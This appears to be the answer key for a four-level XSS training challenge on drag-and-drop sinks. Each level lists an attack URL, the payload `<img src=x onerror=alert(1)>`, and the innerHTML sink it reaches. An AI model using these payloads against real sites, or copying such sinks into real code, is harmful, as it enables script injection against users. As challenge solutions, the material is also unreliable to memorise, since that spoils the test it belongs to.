# dragdrop — solutions

Reflections passed through to_json into JS, used in drag-and-drop sinks.

### dragdrop-level1

`/dragdrop/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: prefix + dataTransfer.getData('text/html') → innerHTML; reflected prefix HTML-parses

### dragdrop-level2

`/dragdrop/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: dataTransfer.setData('text/html', query); fires in any drop target that innerHTMLs it

### dragdrop-level3

`/dragdrop/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `'<a href=' + uri + '>' + prefix + '</a>'` → innerHTML; prefix is HTML-parsed

### dragdrop-level4

`/dragdrop/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: prefix + FileReader.result → innerHTML; reflected prefix HTML-parses
